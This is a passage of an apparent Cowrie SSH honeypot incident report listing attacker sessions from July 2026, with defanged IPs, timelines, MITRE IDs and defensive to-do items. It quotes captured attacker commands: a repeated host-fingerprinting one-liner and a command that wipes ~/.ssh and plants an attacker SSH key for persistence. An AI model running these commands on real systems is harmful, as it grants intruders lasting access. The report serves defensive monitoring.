| `2026-07-08 19:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.196.144[.]45` to AbuseIPDB if not already reported
- [ ] Block `183.196.144[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347c8feeec8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:25 |
| **Last Seen** | 2026-07-08 19:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:25:38` | `cowrie.session.connect` |
| `2026-07-08 19:25:39` | `cowrie.client.version` |
| `2026-07-08 19:25:39` | `cowrie.client.kex` |
| `2026-07-08 19:25:40` | `cowrie.login.success` |
| `2026-07-08 19:25:43` | `cowrie.session.params` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.success` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.command.input` |
| `2026-07-08 19:25:43` | `cowrie.log.closed` |
| `2026-07-08 19:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256e28cdcda9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:26 |
| **Last Seen** | 2026-07-08 19:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:26:23` | `cowrie.session.connect` |
| `2026-07-08 19:26:24` | `cowrie.client.version` |
| `2026-07-08 19:26:24` | `cowrie.client.kex` |
| `2026-07-08 19:26:26` | `cowrie.login.success` |
| `2026-07-08 19:26:27` | `cowrie.session.params` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.success` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:27` | `cowrie.command.input` |
| `2026-07-08 19:26:28` | `cowrie.log.closed` |
| `2026-07-08 19:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f9389dbd73

| Field | Detail |
|---|---|
| **Source IP** | `54.38.78[.]118` |
| **First Seen** | 2026-07-08 19:26 |
| **Last Seen** | 2026-07-08 19:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:26:47` | `cowrie.session.connect` |
| `2026-07-08 19:26:47` | `cowrie.client.version` |
| `2026-07-08 19:26:47` | `cowrie.client.kex` |
| `2026-07-08 19:26:47` | `cowrie.login.success` |
| `2026-07-08 19:26:48` | `cowrie.session.params` |
| `2026-07-08 19:26:48` | `cowrie.command.input` |
| `2026-07-08 19:26:48` | `cowrie.command.failed` |
| `2026-07-08 19:26:48` | `cowrie.log.closed` |
| `2026-07-08 19:26:49` | `cowrie.session.params` |
| `2026-07-08 19:26:49` | `cowrie.command.input` |
| `2026-07-08 19:26:49` | `cowrie.session.file_download` |
| `2026-07-08 19:26:49` | `cowrie.log.closed` |
| `2026-07-08 19:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.78[.]118` to AbuseIPDB if not already reported
- [ ] Block `54.38.78[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32ef867dfb9

| Field | Detail |
|---|---|
| **Source IP** | `54.38.78[.]118` |
| **First Seen** | 2026-07-08 19:26 |
| **Last Seen** | 2026-07-08 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:26:49` | `cowrie.session.connect` |
| `2026-07-08 19:26:49` | `cowrie.client.version` |
| `2026-07-08 19:26:49` | `cowrie.client.kex` |
| `2026-07-08 19:26:50` | `cowrie.login.success` |
| `2026-07-08 19:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.78[.]118` to AbuseIPDB if not already reported
- [ ] Block `54.38.78[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187e094786fe

| Field | Detail |
|---|---|
| **Source IP** | `54.38.78[.]118` |
| **First Seen** | 2026-07-08 19:26 |
| **Last Seen** | 2026-07-08 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:26:50` | `cowrie.session.connect` |
| `2026-07-08 19:26:50` | `cowrie.client.version` |
| `2026-07-08 19:26:50` | `cowrie.client.kex` |
| `2026-07-08 19:26:50` | `cowrie.login.success` |
| `2026-07-08 19:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.38.78[.]118` to AbuseIPDB if not already reported
- [ ] Block `54.38.78[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0b7d50e1de

| Field | Detail |
|---|---|
| **Source IP** | `72.195.114[.]182` |
| **First Seen** | 2026-07-08 19:26 |
| **Last Seen** | 2026-07-08 19:31 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:26:57` | `cowrie.session.connect` |
| `2026-07-08 19:26:57` | `cowrie.client.version` |
| `2026-07-08 19:26:57` | `cowrie.client.kex` |
| `2026-07-08 19:26:59` | `cowrie.login.success` |
| `2026-07-08 19:27:04` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.195.114[.]182` to AbuseIPDB if not already reported
- [ ] Block `72.195.114[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb4718f77d4

| Field | Detail |
|---|---|
| **Source IP** | `77.223.122[.]29` |
| **First Seen** | 2026-07-08 19:27 |
| **Last Seen** | 2026-07-08 19:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:27:23` | `cowrie.session.connect` |
| `2026-07-08 19:27:24` | `cowrie.client.version` |
| `2026-07-08 19:27:24` | `cowrie.client.kex` |
| `2026-07-08 19:27:24` | `cowrie.login.success` |
| `2026-07-08 19:27:25` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.223.122[.]29` to AbuseIPDB if not already reported
- [ ] Block `77.223.122[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5660fca029af

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-07-08 19:27 |
| **Last Seen** | 2026-07-08 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:27:26` | `cowrie.session.connect` |
| `2026-07-08 19:27:27` | `cowrie.client.version` |
| `2026-07-08 19:27:27` | `cowrie.client.kex` |
| `2026-07-08 19:27:29` | `cowrie.login.success` |
| `2026-07-08 19:27:30` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.146[.]109` to AbuseIPDB if not already reported
- [ ] Block `65.20.146[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c192e00caec4

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-08 19:27 |
| **Last Seen** | 2026-07-08 19:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:27:35` | `cowrie.session.connect` |
| `2026-07-08 19:27:36` | `cowrie.client.version` |
| `2026-07-08 19:27:36` | `cowrie.client.kex` |
| `2026-07-08 19:27:38` | `cowrie.login.success` |
| `2026-07-08 19:27:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ca5c3c2394

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-08 19:27 |
| **Last Seen** | 2026-07-08 19:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:27:35` | `cowrie.session.connect` |
| `2026-07-08 19:27:36` | `cowrie.client.version` |
| `2026-07-08 19:27:36` | `cowrie.client.kex` |
| `2026-07-08 19:27:37` | `cowrie.login.success` |
| `2026-07-08 19:27:37` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481f33db929c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:27 |
| **Last Seen** | 2026-07-08 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:27:57` | `cowrie.session.connect` |
| `2026-07-08 19:27:57` | `cowrie.client.version` |
| `2026-07-08 19:27:57` | `cowrie.client.kex` |
| `2026-07-08 19:27:59` | `cowrie.login.success` |
| `2026-07-08 19:28:01` | `cowrie.session.params` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.success` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.command.input` |
| `2026-07-08 19:28:01` | `cowrie.log.closed` |
| `2026-07-08 19:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970f8ae82cf8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:28 |
| **Last Seen** | 2026-07-08 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:28:32` | `cowrie.session.connect` |
| `2026-07-08 19:28:32` | `cowrie.client.version` |
| `2026-07-08 19:28:32` | `cowrie.client.kex` |
| `2026-07-08 19:28:34` | `cowrie.login.success` |
| `2026-07-08 19:28:35` | `cowrie.session.params` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.success` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.command.input` |
| `2026-07-08 19:28:35` | `cowrie.log.closed` |
| `2026-07-08 19:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49ab04507fe4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:30 |
| **Last Seen** | 2026-07-08 19:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:30:19` | `cowrie.session.connect` |
| `2026-07-08 19:30:20` | `cowrie.client.version` |
| `2026-07-08 19:30:20` | `cowrie.client.kex` |
| `2026-07-08 19:30:22` | `cowrie.login.success` |
| `2026-07-08 19:30:24` | `cowrie.session.params` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.success` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.command.input` |
| `2026-07-08 19:30:24` | `cowrie.log.closed` |
| `2026-07-08 19:30:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd06f0dfe3ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:30 |
| **Last Seen** | 2026-07-08 19:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:30:38` | `cowrie.session.connect` |
| `2026-07-08 19:30:38` | `cowrie.client.version` |
| `2026-07-08 19:30:38` | `cowrie.client.kex` |
| `2026-07-08 19:30:39` | `cowrie.login.success` |
| `2026-07-08 19:30:41` | `cowrie.session.params` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.success` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.command.input` |
| `2026-07-08 19:30:41` | `cowrie.log.closed` |
| `2026-07-08 19:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92324a8f5452

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:32 |
| **Last Seen** | 2026-07-08 19:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:32:40` | `cowrie.session.connect` |
| `2026-07-08 19:32:40` | `cowrie.client.version` |
| `2026-07-08 19:32:40` | `cowrie.client.kex` |
| `2026-07-08 19:32:42` | `cowrie.login.success` |
| `2026-07-08 19:32:43` | `cowrie.session.params` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.success` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:43` | `cowrie.command.input` |
| `2026-07-08 19:32:44` | `cowrie.log.closed` |
| `2026-07-08 19:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18423f7df1d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:32 |
| **Last Seen** | 2026-07-08 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:32:52` | `cowrie.session.connect` |
| `2026-07-08 19:32:52` | `cowrie.client.version` |
| `2026-07-08 19:32:52` | `cowrie.client.kex` |
| `2026-07-08 19:32:54` | `cowrie.login.success` |
| `2026-07-08 19:32:55` | `cowrie.session.params` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.success` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
